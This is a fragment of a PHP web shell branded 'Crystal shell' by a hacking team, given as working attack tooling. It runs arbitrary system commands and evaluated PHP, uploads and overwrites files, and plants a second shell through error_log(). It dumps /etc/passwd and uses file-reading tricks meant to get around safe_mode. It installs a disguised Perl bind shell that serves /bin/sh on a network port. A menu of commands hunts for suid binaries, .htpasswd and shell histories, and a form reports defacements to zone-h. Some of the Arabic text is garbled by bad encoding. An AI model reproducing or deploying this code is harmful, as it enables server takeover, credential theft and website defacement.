("chr","&#",$m);
$m=str_replace(" ","",$m);
echo $m ;
}
// ERORR //
if(empty($_POST['ERORR'])){
} else {
$ERORR=$_POST['ERORR'];
echo  error_log("
<html>
<head>
<title> Exploit: error_log() By * Super-Crystal  * </title>
<body bgcolor=\"#000000\">
<table Width='100%' height='10%' bgcolor='#8C0404' border='1'>
<tr>
<td><center><font size='6' color='#BBB516'> By  * Super-Crystal * TrYaG Team</font></center></td>
</tr>
</table>
<font color='#FF0000'>
</head>
<?
if(\$fileup == \"\"){
ECHO \" reade for up \";
}else{
\$path= exec(\"pwd\");
\$path .= \"/\$fileup_name\";
\$CopyFile = copy(\$fileup,\"\$path\");
if(\$CopyFile){
echo \" up ok \";
}else{
echo \" no up \";
}
}
if(empty(\$_POST['m'])){
} else {
\$m=\$_POST['m'];
echo  system(\$m);
}
if(empty(\$_POST['cmd'])){
} else {
\$h=  \$_POST['cmd'];
 print include(\$h) ;
   }


?>
<form method='POST' enctype='multipart/form-data' action='Super-Crystal.php'>
<input type='file' name='fileup' size='20'>
<input type='submit' value='  up  '>
</form>
<form method='POST'  action='Super-Crystal.php'>
<input type='cmd' name='cmd' size='20'>
<input type='submit' value='  open (shill.txt) '>
</form>
<form method='POST' enctype='multipart/form-data' action='Super-Crystal.php'>
<input type='text' name='m' size='20'>
<input type='submit' value='  run  '>
<input type='reset' value=' reset '>
</form>
", 3,$ERORR);
}
// id //
if ($_POST['plugin'] ){


                                  switch($_POST['plugin']){
                                 case("cat /etc/passwd"):
                                           for($uid=0;$uid<6000;$uid++){   //cat /etc/passwd
                                        $ara = posix_getpwuid($uid);
                                                if (!empty($ara)) {
                                                  while (list ($key, $val) = each($ara)){
                                                    print "$val:";
                                                  }
                                                  print "<br>";
                                                }
                                        }

                                break;


                                                }
                                               }

// imap //
$string = !empty($_POST['string']) ? $_POST['string'] : 0;
$switch = !empty($_POST['switch']) ? $_POST['switch'] : 0;

if ($string && $switch == "file") {
$stream = imap_open($string, "", "");

$str = imap_body($stream, 1);
if (!empty($str))
echo "<pre>".$str."</pre>";
imap_close($stream);
} elseif ($string && $switch == "dir") {
$stream = imap_open("/etc/passwd", "", "");
if ($stream == FALSE)
die("Can't open imap stream");
$string = explode("|",$string);
if (count($string) > 1)
$dir_list = imap_list($stream, trim($string[0]), trim($string[1]));
else
$dir_list = imap_list($stream, trim($string[0]), "*");
echo "<pre>";
for ($i = 0; $i < count($dir_list); $i++)
echo "$dir_list[$i]"."<p>&nbsp;</p>" ;
echo "</pre>";
imap_close($stream);
}
// CURL //
if(empty($_POST['curl'])){
} else {
$m=$_POST['curl'];
$ch =
curl_init("file:///".$m."\x00/../../../../../../../../../../../../".__FILE__);
curl_exec($ch);
var_dump(curl_exec($ch));
}

// copy//
$u1p="";
$tymczas="";
if(empty($_POST['copy'])){
} else {
$u1p=$_POST['copy'];
$temp=tempnam($tymczas, "cx");
if(copy("compress.zlib://".$u1p, $temp)){
$zrodlo = fopen($temp, "r");
$tekst = fread($zrodlo, filesize($temp));
fclose($zrodlo);
echo "".htmlspecialchars($tekst)."";
unlink($temp);
} else {
die("<FONT COLOR=\"RED\"><CENTER>Sorry... File
<B>".htmlspecialchars($u1p)."</B> dosen't exists or you don't have
access.</CENTER></FONT>");
}
}

@$dir = $_POST['dir'];
$dir = stripslashes($dir);

@$cmd = $_POST['cmd'];
$cmd = stripslashes($cmd);
$REQUEST_URI = $_SERVER['REQUEST_URI'];
$dires = '';
$files = '';




if (isset($_POST['port'])){
$bind = "
#!/usr/bin/perl

\$port = {$_POST['port']};
\$port = \$ARGV[0] if \$ARGV[0];
exit if fork;
$0 = \"updatedb\" . \" \" x100;
\$SIG{CHLD} = 'IGNORE';
use Socket;
socket(S, PF_INET, SOCK_STREAM, 0);
setsockopt(S, SOL_SOCKET, SO_REUSEADDR, 1);
bind(S, sockaddr_in(\$port, INADDR_ANY));
listen(S, 50);
while(1)
{
	accept(X, S);
	unless(fork)
	{
		open STDIN, \"<&X\";
		open STDOUT, \">&X\";
		open STDERR, \">&X\";
		close X;
		exec(\"/bin/sh\");
	}
	close X;
}
";}

function decode($buffer){

return  convert_cyr_string ($buffer, 'd', 'w');

}



function execute($com)
{

 if (!empty($com))
 {
  if(function_exists('exec'))
   {
    exec($com,$arr);
   echo implode('
',$arr);
   }
  elseif(function_exists('shell_exec'))
   {
    echo shell_exec($com);


   }
  elseif(function_exists('system'))
{

    echo system($com);
}
  elseif(function_exists('passthru'))
   {

    echo passthru($com);

   }
}

}


function perms($mode)
{

if( $mode & 0x1000 ) { $type='p'; }
else if( $mode & 0x2000 ) { $type='c'; }
else if( $mode & 0x4000 ) { $type='d'; }
else if( $mode & 0x6000 ) { $type='b'; }
else if( $mode & 0x8000 ) { $type='-'; }
else if( $mode & 0xA000 ) { $type='l'; }
else if( $mode & 0xC000 ) { $type='s'; }
else $type='u';
$owner["read"] = ($mode & 00400) ? 'r' : '-';
$owner["write"] = ($mode & 00200) ? 'w' : '-';
$owner["execute"] = ($mode & 00100) ? 'x' : '-';
$group["read"] = ($mode & 00040) ? 'r' : '-';
$group["write"] = ($mode & 00020) ? 'w' : '-';
$group["execute"] = ($mode & 00010) ? 'x' : '-';
$world["read"] = ($mode & 00004) ? 'r' : '-';
$world["write"] = ($mode & 00002) ? 'w' : '-';
$world["execute"] = ($mode & 00001) ? 'x' : '-';
if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
$s=sprintf("%1s", $type);
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
return trim($s);
}






if(isset($_POST['post']) and $_POST['post'] == "yes" and @$HTTP_POST_FILES["userfile"][name] !== "")
{
copy($HTTP_POST_FILES["userfile"]["tmp_name"],$HTTP_POST_FILES["userfile"]["name"]);
}

if((isset($_POST['fileto']))||(isset($_POST['filefrom'])))

{
$data = implode("", file($_POST['filefrom']));
$fp = fopen($_POST['fileto'], "wb");
fputs($fp, $data);
$ok = fclose($fp);
if($ok)
{
$size = filesize($_POST['fileto'])/1024;
$sizef = sprintf("%.2f", $size);
print "<center><div id=logostrip>Download - OK. (".$sizef."??)</div></center>";
}
else
{
print "<center><div id=logostrip>Something is wrong. Download - IS NOT OK</div></center>";
}
}

if (isset($_POST['installbind'])){

if (is_dir($_POST['installpath']) == true){
chdir($_POST['installpath']);
$_POST['installpath'] = "temp.pl";}


$fp = fopen($_POST['installpath'], "w");
fwrite($fp, $bind);
fclose($fp);

exec("perl " . $_POST['installpath']);
chdir($dir);


}


@$ef = stripslashes($_POST['editfile']);
if ($ef){
$fp = fopen($ef, "r");
$filearr = file($ef);



$string = '';
$content = '';
foreach ($filearr as $string){
$string = str_replace("<" , "&lt;" , $string);
$string = str_replace(">" , "&gt;" , $string);
$content = $content . $string;
}

echo "<center><div id=logostrip>Edit file: $ef </div><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=content cols=100 rows=20>$content</textarea>
<input type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
<input type=\"hidden\" name=\"savefile\" value=\"{$_POST['editfile']}\"><br>
<input type=\"submit\" name=\"submit\" value=\"Save\" id=input></form></center>";
fclose($fp);
}

if(isset($_POST['savefile'])){

$fp = fopen($_POST['savefile'], "w");
$content = stripslashes($content);
fwrite($fp, $content);
fclose($fp);
echo "<center><div id=logostrip>saved -OK!</div></center>";

}


if (isset($_POST['php'])){

echo "<center><div id=logostrip>eval code<br><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=phpcode cols=100 rows=20></textarea><br>
<input type=\"submit\" name=\"submit\" value=\"Exec\" id=input></form></center></div>";
}



if(isset($_POST['phpcode'])){

echo "<center><div id=logostrip>Results of PHP execution<br><br>";
@eval(stripslashes($_POST['phpcode']));
echo "</div></center>";


}


if ($cmd){

if($sertype == "winda"){
ob_start();
execute($cmd);
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
}
else{
ob_start();
echo decode(execute($cmd));
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
}

if (trim($buffer)){
echo "<center><div id=logostrip>Command: $cmd<br><textarea cols=100 rows=20>";
echo decode($buffer);
echo "</textarea></center></div>";
}

}
$arr = array();

$arr = array_merge($arr, glob("*"));
$arr = array_merge($arr, glob(".*"));
$arr = array_merge($arr, glob("*.*"));
$arr = array_unique($arr);
sort($arr);
echo "<table><tr><td>Name</td><td><a title=\"Type of object\">Type</a></td><td>Size</td><td>Last access</td><td>Last change</td><td>Perms</td><td><a title=\"If Yes, you have write permission\">Write</a></td><td><a title=\"If Yes, you have read permission\">Read</a></td></tr>";

foreach ($arr as $filename) {

if ($filename != "." and $filename != ".."){

if (is_dir($filename) == true){
$directory = "";
$directory = $directory . "<tr><td>$filename</td><td>" . filetype($filename) . "</td><td></td><td>" . date("G:i j M Y",fileatime($filename)) . "</td><td>" . date("G:i j M Y",filemtime($filename)) . "</td><td>" . perms(fileperms($filename));
if (is_writable($filename) == true){
$directory = $directory . "<td>Yes</td>";}
else{
$directory = $directory . "<td>No</td>";

}

if (is_readable($filename) == true){
$directory = $directory . "<td>Yes</td>";}
else{
$directory = $directory . "<td>No</td>";
}
$dires = $dires . $directory;
}

if (is_file($filename) == true){
$file = "";
$file = $file . "<tr><td><a onclick=tag('$filename')>$filename</a></td><td>" . filetype($filename) . "</td><td>" . filesize($filename) . "</td><td>" . date("G:i j M Y",fileatime($filename)) . "</td><td>" . date("G:i j M Y",filemtime($filename)) . "</td><td>" . perms(fileperms($filename));
if (is_writable($filename) == true){
$file = $file . "<td>Yes</td>";}
else{
$file = $file . "<td>No</td>";
}

if (is_readable($filename) == true){
$file = $file . "<td>Yes</td></td></tr>";}
else{
$file = $file . "<td>No</td></td></tr>";
}
$files = $files . $file;
}



}



}
echo $dires;
echo $files;
echo "</table><br>";




echo "
<form action=\"$REQUEST_URI\" method=\"POST\">
Command:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\">


Directory:<INPUT type=\"text\" name=\"dir\" size=30 value=\"";

echo getcwd();
echo "\">
<INPUT type=\"submit\" value=\"..Exec..\"></form>";





if (ini_get('safe_mode') == 1){echo "<br><font size=\"3\"color=\"#cc0000\"><b>SAFE MOD IS ON<br>
Including from here: "
. ini_get('safe_mode_include_dir') . "<br>Exec here: " . ini_get('safe_mode_exec_dir'). "</b></font>";}




?>


</td></tr></table></p></td></tr></table>
	</a><br><hr size="1" noshade><p align="right">
	<font face="Wingdings 3" size="5" color="#DCE7EF">&lt;</font><b><select name="act"><option value="ls">
	With selected:</option><option value="delete">Delete</option><option value="archive">
	Archive</option><option value="cut">Cut</option><option value="copy">Copy</option><option value="unselect">
	Unselect</option></select>&nbsp;<input type="submit" value="Confirm"></p></form></td></tr></table><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td width="100%" height="1" valign="top" colspan="2" bgcolor="#000000"><p align="center">
	<b>
	:: </b>
	<font face=Verdana size=-2><a href="?act=command">Executed command</a></font><b> ::</b></p></td></tr><tr><td width="50%" height="1" valign="top" bgcolor="#000000" style="color: #000000; border: 1px solid #000000"><center><b>
	<?
	echo "
<form action=\"$REQUEST_URI\" method=\"POST\">
Command:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\">";
?>
		<input type="submit" name="submit1" value="Command" style="border: 1px solid #000000"><font face="Wingdings 3" color="#DCE7EF" size="3">f</font></form><p>
	&nbsp;</p>
	</td>
	<td width="50%" height="1" valign="top" bgcolor="#000000" style="color: #000000"><center>
	<form action="?act=cmd" method="POST"><input type="hidden" name="act" value="cmd"><input type="hidden" name="d" value="c:/appserv/www/shells/">
		<font color="#DCE7EF">Select</font><font face="Wingdings 3" color="#DCE7EF" size="3">g</font><select name="cmd" size="1"><option value="ls -la">
		-----------------------------------------------------------</option>
		<option value="ls -la /var/lib/mysq">ls MySQL</option>
		<option value="which curl">cURL ?</option>
		<option value="which wget">Wget ?</option>
		<option value="which lynx">Lynx ?</option>
		<option value="which links">links ?</option>
		<option value="which fetch">fetch ?</option>
		<option value="which GET">GET ?</option>
		<option value="which per">Perl ?</option>
		<option value="gcc --help">C gcc Help ?</option>
		<option value="tar --help">tar Help ?</option>
		<option value="cat /etc/passwd">Get passwd !!!</option>
		<option value="cat /etc/hosts">Get hosts</option>
		<option value="perl --help">Perl Help ?</option>
		<option value="find / -type f -perm -04000 -ls">
		find all suid files</option><option value="find . -type f -perm -04000 -ls">
		find suid files in current dir</option><option value="find / -type f -perm -02000 -ls">
		find all sgid files</option><option value="find . -type f -perm -02000 -ls">
		find sgid files in current dir</option><option value="find / -type f -name config.inc.php">
		find config.inc.php files</option><option value="find / -type f -name &quot;config*&quot;">
		find config* files</option><option value="find . -type f -name &quot;config*&quot;">
		find config* files in current dir</option><option value="find / -perm -2 -ls">
		find all writable directories and files</option><option value="find . -perm -2 -ls">
		find all writable directories and files in current dir</option><option value="find / -type f -name service.pwd">
		find all service.pwd files</option><option value="find . -type f -name service.pwd">
		find service.pwd files in current dir</option><option value="find / -type f -name .htpasswd">
		find all .htpasswd files</option><option value="find . -type f -name .htpasswd">
		find .htpasswd files in current dir</option><option value="find / -type f -name .bash_history">
		find all .bash_history files</option><option value="find . -type f -name .bash_history">
		find .bash_history files in current dir</option><option value="find / -type f -name .fetchmailrc">
		find all .fetchmailrc files</option><option value="find . -type f -name .fetchmailrc">
		find .fetchmailrc files in current dir</option><option value="lsattr -va">
		list file attributes on a Linux second extended file system</option><option value="netstat -an | grep -i listen">
		show opened ports</option></select><input type="hidden" name="cmd_txt" value="1">&nbsp;<input type="submit" name="submit" value="Execute" style="border: 1px solid #000000"></form></td></tr></TABLE><a bookmark="minipanel" href="?act=bind"><font face="Verdana" size="-2">Bind port to</font><font face="Webdings" size="5" color="#DCE7EF">¬</font></a><font color="#00FF00"><br>
</font>
<a bookmark="minipanel">
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr>
 <td width="50%" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><form method="POST">
	<p align="center">
<a bookmark="minipanel">
	<b><font face="verdana" color="red" size="4">
	<a style="font-weight: normal; font-family: verdana; text-decoration: none" bookmark="minipanel">
	<font face="verdana" size="2" color="#DCE7EF">::</font></a></font></b><a href="?act=edit" bookmark="minipanel"><span lang="en-us"><font face="Verdana" size="2">Edit/Create
	file</font></span></a><b><font face="verdana" color="red" size="4"><a style="font-weight: normal; font-family: verdana; text-decoration: none" bookmark="minipanel"><font face="verdana" size="2" color="#DCE7EF">::</font></a></font></b><font face="Wingdings 2" size="2">&quot;</font></p><p align="center">
	&nbsp;<?
if ($act == "edit") {echo "<center><b>«· Õ—Ì— Ê«·«‰‘«¡:<br><br> ﬁ„ »Ê÷⁄ «”„ «·„·› «·–Ì  —Ìœ  Õ—Ì—Â ›ﬁÿ<br>Ê»⁄œ –«·ﬂ «·÷€ÿ ⁄·Ï config.php „À«·<br>Edit<br>” ŸÂ— ·ﬂ ‰«›–Â »Â« „Õ ÊÌ«  «·„·› <br>Ê«Ì÷«  «–« «—œ  «‰‘«¡ „·› ›ﬁÿ ÷⁄ «”„Â „⁄ «·«„ œ«œ <br>Ê»⁄œ –«·ﬂ «ﬂ » „« —Ìœ washer-crystal.txt   </a>.</b>";}
?>
	</p>
	<p>&nbsp;</p>
	<p>	<?
	echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
File to edit:
<input type=\"text\" name=\"editfile\" >
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
<INPUT type=\"submit\" value=\"Edit\"></form></div>";
?>
	</p>
	</form></center></p></td>
 <td width="50%" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
                 <?
if ($act == "upload") {echo "<center><b>—›⁄ «·„·›« :<br><br>ﬁ„ » ÕœÌœ «·„·› «·„—«œ —›⁄Â <br>Ê»⁄œ –«·ﬂ ﬁ„ »«·÷€ÿ ⁄·Ï «·ŒÌ«— «·„Ê÷Õ<br>UPLOAD< </a>.</b>";}
?><a bookmark="minipanel"><b><font size="2">::
	</font>
	</b><a href="?act=upload"><span lang="en-us"><font face="Verdana" size="2">
					upload</font></span></a><b><font size="2">::</font></b><font face=Webdings size=2>&#325;</font><font size="2"></a></a></font><br><form method="POST" ENCTYPE="multipart/form-data"><input type="hidden" name="miniform" value="1"><input type="hidden" name="act" value="upload">&nbsp;
		<?
		echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<INPUT type=\"file\" name=\"userfile\">
<INPUT type=\"hidden\" name=\"post\" value=\"yes\">
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
<INPUT type=\"submit\" value=\"Download\"></form></div>";
?>
	<p></form></p></td>

</tr>
</table>	<b>
<font size=-2 face=verdana color="white">
                  <p>&nbsp;<a href="?act=Defacer">Defacer Zone-H</a></font><p align="center">&nbsp;
</p>
 					<?
if ($act == "Defacer") {echo "<center><b>CRYSTAL-H:<br><br>«”„ «·„⁄·‰ Defacer<br>«·„Êﬁ⁄ «·„Œ —ﬁ Victim<br>Ê÷⁄ «·«Œ —«ﬁ «Ì ‰Ê⁄ «·À€—Â «· Ï «” À„— Â« Attack Mode <br> ”»» «·«Œ —«ﬁ Attack Reason <br>·«—”«· «·«Œ —«ﬁ sand   <br> ·—ƒÌÂ «Œ— «· Õ–Ì—«  «·„—”·Â »«·„Êﬁ⁄ Attacks On Hold</a>.</b>";}
?>                 <p align="center"><font face="Verdana" color="#CC0000">
                  <SCRIPT language=JavaScript type=text/javascript>
        <!--
        function validate(){
            document.notifyForm.action = "http://www.zone-h.org/component/option,com_notify/Itemid,89/task,single/"
            document.notifyForm.submit();
        }
        //-->
        </SCRIPT>

                  Defacer </font></font></font>
<font face=Verdana color=#CC0000>
					Zone-h</font><FORM name=notifyForm
                  action=http://www.zone-h.org/component/option,com_notify/Itemid,89/task,single/
                  method=post>
                  <TABLE class=contentpane cellSpacing=0 cellPadding=0
                  width="100%" border=0>
                    <TBODY>
                    <!-- DESCRIPTION -->
                    <TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                      <TD style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa"></TD></TR><!-- INSTRUCTIONS -->
                    </TBODY></TABLE>
                  <TABLE cellSpacing=0 cellPadding=10 width="100%" border=0 style="color: #CC0000; border: 1px outset #000000; background-color: #000000">
                    <TBODY>
                    <TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                      <TD align=left style="color: #DCE7EF; border: 1px solid #FFFFFF; background-color: #000000" bgcolor="#000000" bordercolorlight="#000000" bordercolordark="#000000">
                        <TABLE width="100%" style="border: 1px outset #eeeeee; background-color: #EEEEEE">
                          <TBODY>
                          <TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                            <TD style="border-left:1px solid #eeeeee; border-right:1px solid #aaaaaa; border-top:1px solid #eeeeee; border-bottom:1px solid #aaaaaa; BACKGROUND-COLOR: #000000"
                              align=left><SPAN
                              style="FONT-SIZE: 4px">&nbsp;</SPAN></TD></TR></TBODY></TABLE><!-- Input Form --><TABLE class=notifyForm width="100%">
                          <TBODY>
                          <TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                            <TD noWrap align=left width="15%"
                              height=20 style="color: #000000; border: 1px solid #000000; background-color: #000000"><b><font size="1" color="#FF0000">
							::Defacer::</font></b>:<font size=-2 face=verdana color=white><b><font face=Wingdings color=gray size="1">Ë</font></TD><TD noWrap align=left height=20 style="color: #000000; border: 1px solid #000000; background-color: #000000">
							<INPUT
                              class=inputbox id=defacer style="WIDTH: 276px; color:#CC0000; background-color:#EEEEEE"
                              maxLength=64 name=defacer size="1" value="Super-Crystal"> </font></font>
							</font></TD>
							<font size=-2 face=verdana color=white>
                          <TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                            <TD noWrap align=left height=20 style="color: #000000; border: 1px solid #000000; background-color: #000000">
							<b><font size="1" color="#FF0000">::Victim::</font></b>:<font size=-2 face=verdana color=white><b><font face=Wingdings color=gray size="1">Ë</font></TD><TD noWrap align=left height=20 style="color: #000000; border: 1px solid #000000; background-color: #000000">
							<INPUT
                              class=inputbox id=domain style="WIDTH: 276px; color:#CC0000; background-color:#EEEEEE"
                              maxLength=250 value=http://www.microsoft.com name=domain size="1"> </TD>
                          <TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                            <TD noWrap align=left height=20 style="color: #000000; border: 1px solid #000000; background-color: #000000">
							<b>
							<font color="#FF0000" size="1">Attack Mode</font></b>:<font size=-2 face=verdana color=white><b><font face=Wingdings color=gray size="1">Ë</font></TD><TD align=left height=20 style="color: #000000; border: 1px solid #000000; background-color: #000000">
							<SELECT class=inputbox
                              style="WIDTH: 276px; color:#CC0000; background-color:#EEEEEE" name=method size="1"> <OPTION
                                value="" selected>choose</OPTION> <OPTION
                                value=23>Access credentials through Man In the
							Middle attack</OPTION><OPTION value=22>Attack
							against the administrator/user (password
							stealing/sniffing)</OPTION><OPTION value=29>DNS
							attack through cache poisoning</OPTION><OPTION
                                value=28>DNS attack through social engineering</OPTION><OPTION value=17>
							File Inclusion</OPTION><OPTION value=9>FTP Server
							intrusion</OPTION><OPTION value=8>Mail Server
							intrusion</OPTION><OPTION value=30>Not available</OPTION><OPTION value=14>
							Other Server intrusion</OPTION><OPTION value=18>
							Other Web Application bug</OPTION><OPTION value=19>
							Remote administrative panel access through
							bruteforcing</OPTION><OPTION value=20>Remote
							administrative panel access through password
							guessing</OPTION><OPTION value=21>Remote
							administrative panel access through social
							engineering</OPTION><OPTION value=25>Remote service
							password bruteforce</OPTION><OPTION
                                value=24>Remote service password guessing</OPTION><OPTION value=26>
							Rerouting after attacking the Firewall</OPTION><OPTION
                                value=27>Rerouting after attacking the Router</OPTION><OPTION value=12>
							RPC Server intrusion</OPTION><OPTION value=13>Shares
							misconfiguration</OPTION><OPTION value=15>SQL
							Injection</OPTION><OPTION value=10>SSH Server
							intrusion</OPTION><OPTION value=11>Telnet Server
							intrusion</OPTION><OPTION value=16>URL Poisoning</OPTION><OPTION value=7>
							Web Server external module intrusion</OPTION><OPTION
                                value=6>Web Server intrusion</OPTION></SELECT></TD></TR><TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                            <TD noWrap align=left height=20 style="color: #000000; border: 1px solid #000000; background-color: #000000">
							<b>
							<font size="1" color="#FF0000">Attack Reason</font></b>:<font size=-2 face=verdana color=white><b><font face=Wingdings color=gray size="1">Ë</font></TD><TD align=left height=20 style="color: #000000; border: 1px solid #000000; background-color: #000000">
							<SELECT class=inputbox
                              style="WIDTH: 276px; color:#CC0000; background-color:#EEEEEE" name=reason size="1"> <OPTION
                                value="" selected>choose</OPTION> <OPTION
                                value=4>As a challenge</OPTION><OPTION
                                value=1>Heh...just for fun!</OPTION><OPTION
                                value=5>I just want to be the best defacer</OPTION><OPTION value=7>
							Not available</OPTION><OPTION
                                value=6>Patriotism</OPTION><OPTION
                                value=3>Political reasons</OPTION><OPTION
                                value=2>Revenge against that website</OPTION></SELECT></TD></TR></TBODY></TABLE><TABLE width="100%" style="border: 1px outset #eeeeee; background-color: #EEEEEE">
                          <TBODY>
                          <TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                            <TD style="border-left:1px solid #eeeeee; border-right:1px solid #aaaaaa; border-top:1px solid #eeeeee; border-bottom:1px solid #aaaaaa; BACKGROUND-COLOR: #000000"
                              align=left><SPAN
                              style="FONT-SIZE: 4px">&nbsp;</SPAN></TD></TR></TBODY></TABLE><DIV style="CLEAR: both"></DIV>
                        <TABLE class=notifyForm width="100%">
                          <TBODY>
                          <TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                            <TD align=left style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa" bgcolor="#000000">
							<INPUT class=button onclick=validate() type=button value=Send name=send style="color: #CC0000; border: 1px solid #C0C0C0; background-color: #EEEEEE">&nbsp;&nbsp;<b><font size=4 face="Wingdings 3">:</font></b>&nbsp;&nbsp;
							</font></font>
<font size=6 face=Webdings color="#FF0000">L </font><b>
							<a class="sublevel" href="http://www.zone-h.org/component/option,com_attacks/Itemid,45/">
							<font color="#FF0000">Attacks On Hold</font></a></b><font color="#FF0000">
							</font>
<font size=6 face=Webdings color="#FF0000">L</TD></TR></TBODY></TABLE><INPUT type=hidden
                        value=com_notify name=option style="font-family: Verdana; font-size: 10px; color: black; border: 2px solid black; background-color: #C0C0C0"></TR></TBODY></TABLE></FORM></font></b><br>
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
	<td width="990" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
	<b>
	&nbsp;</b><font face="Wingdings 3" size="5">y</font><b>Crystal shell v. 1 beta&nbsp; </b><font color="#CC0000"><b>©oded by</b> </font><b><a href="http://www.tryag.com">TrYaG Team</a> <span lang="en-us">l</span></b> <b><a href="?act=team">Arab Security Center Team</a> |<a href="http://www.secure4center.com"><font color="#DCE7EF">securityCenter</font></a>|
	: Web </b><font face="Wingdings 3" size="5">x</font></p><p align="center">&nbsp;</p></td></tr></table>

</a>


<div align="right">

<span lang="en-us">&nbsp; </span><TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD align=middle style="font-family: verdana, arial, 'ms sans serif', sans-serif; font-size: 11px; color: #D5ECF9">
      <TABLE class=calendar_table cellSpacing=1 cellPadding=1>
        <TBODY>
        <TR>
          <TD class=calendar_month colSpan=7><span lang="en-us">CRYSTAL-<font color="#CC0000">H</font></span><font color="#CC0000">
			2006</font></TD></TR><TR>
          <TD class=calendar_days>P</TD><TD class=calendar_days>P</TD><TD class=calendar_days>S</TD><TD class=calendar_days>C</TD><TD class=calendar_days>P</TD><TD class=calendar_days>C</TD><TD class=calendar_days>C</TD></TR><TR>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD></TR>
        <TR>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day>1 </TD></TR>
        <TR>
          <TD class=calendar_day>2 </TD>
          <TD class=calendar_day>3 </TD>
          <TD class=calendar_day><font color="#FF0000">4 </font> </TD>
          <TD class=calendar_day><font color="#FF0000">5 </font> </TD>
          <TD class=calendar_day><font color="#FF0000">6 </font> </TD>
          <TD class=calendar_day><font color="#FF0000">7 </font> </TD>
          <TD class=calendar_day><font color="#FF0000">8 </font> </TD></TR>
        <TR>
          <TD class=calendar_day>9 </TD>
          <TD class=calendar_day><font color="#FF0000">10 </font> </TD>
          <TD class=calendar_day><font color="#FF0000">11 </font> </TD>
          <TD class=calendar_day><font color="#FF0000">12 </font> </TD>
          <TD class=calendar_day>13</TD><TD class=calendar_day>14 </TD>
          <TD class=calendar_day>15 </TD></TR>
        <TR>
          <TD class=calendar_day><font color="#FF0000">16 </font> </TD>
          <TD class=calendar_day><font color="#FF0000">17 </font> </TD>
          <TD class=calendar_day><font color="#FF0000">18</font></TD><TD class=calendar_day>19</TD><TD class=calendar_day>20 </TD>
          <TD class=calendar_day>21 </TD>
          <TD class=calendar_current_day>22 </TD></TR>
        <TR>
          <TD class=calendar_day>23</TD><TD class=calendar_day>24</TD><TD class=calendar_day>25</TD><TD class=calendar_day>26</TD><TD class=calendar_day><font color="#FF0000">27</font></TD><TD class=calendar_day><font color="#FF0000">28</font></TD><TD class=calendar_day><font color="#FF0000">29</font></TD></TR><TR>
          <TD class=calendar_day>30</TD><TD class=calendar_day>31</TD><TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD></TR></TBODY></TABLE></TD></TR>
  </TBODY></TABLE>

        </div>


</body></html>
